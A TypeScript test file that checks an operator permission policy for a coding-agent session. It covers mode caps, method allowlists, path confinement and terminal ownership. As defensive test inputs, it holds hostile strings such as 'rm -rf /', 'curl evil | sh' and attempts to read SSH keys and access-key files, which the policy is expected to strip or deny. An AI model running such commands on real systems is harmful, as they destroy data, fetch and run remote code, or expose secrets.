import { describe, expect, it } from 'vitest';
import {
    MAX_OPERATOR_TERMINALS_PER_GRANT,
    OperatorError,
    operatorMayUseMode,
    pathWithinRoot,
    planOperatorSessionCall,
    planOperatorTerminalCall,
} from './operatorPolicy';

const ctx = { cwd: '/home/owner/repo', currentMode: 'default' };
const termCtx = (registry: Array<{ terminalId: string; kind: 'opened' | 'attached' }> = []) => ({
    cwd: '/home/owner/repo', sessionTerminalId: 'sess-term', registry, newTerminalId: () => 'op-new',
});
const code = (fn: () => unknown) => { try { fn(); } catch (e) { return e instanceof OperatorError ? e.code : 'other'; } return null; };

describe('B-867 operator policy', () => {
    it('mode cap: never above the owner\'s current effective mode; unknown modes refused', () => {
        expect(operatorMayUseMode('plan', 'default')).toBe(true);
        expect(operatorMayUseMode('default', 'default')).toBe(true);
        expect(operatorMayUseMode('acceptEdits', 'default')).toBe(false);
        expect(operatorMayUseMode('bypassPermissions', 'acceptEdits')).toBe(false);
        expect(operatorMayUseMode('bypassPermissions', 'bypassPermissions')).toBe(true);
        expect(operatorMayUseMode('yolo', 'default')).toBe(false);
        expect(operatorMayUseMode('default', 'yolo')).toBe(true);
        expect(operatorMayUseMode('acceptEdits', undefined)).toBe(false); // unreported = default
        expect(operatorMayUseMode('some-future-mode', 'yolo')).toBe(false);
    });

    it('only allowlisted session methods pass; owner-only ones are denied', () => {
        for (const method of ['killSession', 'conversation-rewind', 'switch', 'teams-adopt', 'claude-runtime-control', 'spawn-happy-session', 'agent-profile-list', 'fs-read']) {
            expect(code(() => planOperatorSessionCall(method, {}, ctx))).toBe('operator_method_denied');
        }
        expect(planOperatorSessionCall('abort', {}, ctx).method).toBe('abort');
    });

    it('permission: strips allowTools, refuses an escalating mode, keeps answers', () => {
        const plan = planOperatorSessionCall('permission', { id: 'p1', approved: true, allowTools: ['Bash(*)'], updatedInput: { answers: { q: 'a' } } }, ctx);
        expect(plan.params).toEqual({ id: 'p1', approved: true, updatedInput: { answers: { q: 'a' } } });
        expect(code(() => planOperatorSessionCall('permission', { id: 'p1', approved: true, mode: 'bypassPermissions' }, ctx))).toBe('operator_mode_escalation');
        expect((planOperatorSessionCall('permission', { id: 'p1', approved: true, mode: 'plan' }, ctx).params as any).mode).toBe('plan');
        expect(code(() => planOperatorSessionCall('set-permission-mode', { mode: 'acceptEdits' }, ctx))).toBe('operator_mode_escalation');
        expect(planOperatorSessionCall('set-permission-mode', { mode: 'plan' }, ctx).audit?.kind).toBe('mode');
    });

    it('run intent keeps only model / effort fields', () => {
        const plan = planOperatorSessionCall('session-run-intent', { modelIntent: 'opus', effort: 'high', provider: 'evil', accountId: 'x' }, ctx);
        expect(plan.params).toEqual({ modelIntent: 'opus', effort: 'high' });
    });

    it('steer carries no operator text', () => {
        expect(planOperatorSessionCall('steer', { text: 'rm -rf /' }, ctx).params).toEqual({});
    });

    it('file / bash RPCs stay inside the session cwd', () => {
        expect(pathWithinRoot('src/a.ts', '/home/owner/repo')).toBe(true);
        expect(pathWithinRoot('/home/owner/repo', '/home/owner/repo')).toBe(true);
        expect(pathWithinRoot('/home/owner/repo-evil/x', '/home/owner/repo')).toBe(false);
        expect(pathWithinRoot('../.happy/accounts/a/secret', '/home/owner/repo')).toBe(false);
        expect(pathWithinRoot('/home/owner/.ssh/id_rsa', '/home/owner/repo')).toBe(false);
        expect(code(() => planOperatorSessionCall('readFile', { path: '/home/owner/.happy/access.key' }, ctx))).toBe('operator_path_denied');
        expect(code(() => planOperatorSessionCall('bash', { command: 'git status', cwd: '/' }, ctx))).toBe('operator_path_denied');
        expect(code(() => planOperatorSessionCall('listDirectory', { path: '../' }, ctx))).toBe('operator_path_denied');
        expect(planOperatorSessionCall('readFile', { path: 'README.md' }, ctx).audit).toBeNull();
        expect(planOperatorSessionCall('bash', { command: 'git status --porcelain', cwd: '/home/owner/repo' }, ctx).audit).toEqual({ kind: 'bash', detail: { path: '/home/owner/repo', command: 'git status --porcelain' } });
    });

    it('terminal.open: server id + session cwd + encStream; client cwd / startupCommand / attachTmux ignored', () => {
        const plan = planOperatorTerminalCall('terminal.open', { cols: 100, rows: 30, cwd: '/', startupCommand: 'curl evil | sh', attachTmux: { id: '$1', name: 'main' }, terminalId: 'owner-term' }, termCtx());
        expect(plan).toEqual({
            kind: 'machine', method: 'open-terminal',
            params: { terminalId: 'op-new', cols: 100, rows: 30, cwd: '/home/owner/repo', encStream: true },
            register: { terminalId: 'op-new', kind: 'opened' }, auditKind: 'terminal.open',
        });
        const full = Array.from({ length: MAX_OPERATOR_TERMINALS_PER_GRANT }, (_, i) => ({ terminalId: `op-${i}`, kind: 'opened' as const }));
        expect(code(() => planOperatorTerminalCall('terminal.open', {}, termCtx(full)))).toBe('operator_terminal_limit');
    });

    it('terminal.attach: only own terminals or the session\'s own terminal (by role, not id)', () => {
        expect(code(() => planOperatorTerminalCall('terminal.attach', { terminalId: 'owner-other' }, termCtx()))).toBe('operator_terminal_denied');
        const session = planOperatorTerminalCall('terminal.attach', { session: true, cols: 80, rows: 24, startupCommand: 'x' }, termCtx());
        expect(session).toMatchObject({ kind: 'machine', params: { terminalId: 'sess-term', attachOnly: true, encStream: true }, register: { terminalId: 'sess-term', kind: 'attached' } });
        expect((session as any).params.startupCommand).toBeUndefined();
        const own = planOperatorTerminalCall('terminal.attach', { terminalId: 'op-1', fromSeq: 7 }, termCtx([{ terminalId: 'op-1', kind: 'opened' }]));
        expect(own).toMatchObject({ params: { terminalId: 'op-1', fromSeq: 7, attachOnly: true } });
        expect((own as any).register).toBeUndefined();
    });

    it('history / scroll / paste / kill only on own terminals; the session terminal is never killed', () => {
        const registry = [{ terminalId: 'op-1', kind: 'opened' as const }, { terminalId: 'sess-term', kind: 'attached' as const }];
        expect(code(() => planOperatorTerminalCall('terminal.paste', { terminalId: 'owner-other', text: 'x' }, termCtx(registry)))).toBe('operator_terminal_denied');
        expect(planOperatorTerminalCall('terminal.paste', { terminalId: 'op-1', text: 'x' }, termCtx(registry))).toMatchObject({ method: 'terminal-paste' });
        expect(code(() => planOperatorTerminalCall('terminal.kill', { terminalId: 'sess-term' }, termCtx(registry)))).toBe('operator_terminal_denied');
        expect(planOperatorTerminalCall('terminal.kill', { terminalId: 'op-1', alsoAttached: true }, termCtx(registry))).toEqual({
            kind: 'machine', method: 'kill-terminal', params: { terminalId: 'op-1' }, unregister: 'op-1', auditKind: 'terminal.kill',
        });
        expect(code(() => planOperatorTerminalCall('list-terminals', {}, termCtx()))).toBe('operator_method_denied');
        expect(planOperatorTerminalCall('terminal.list', {}, termCtx())).toEqual({ kind: 'list' });
    });
});
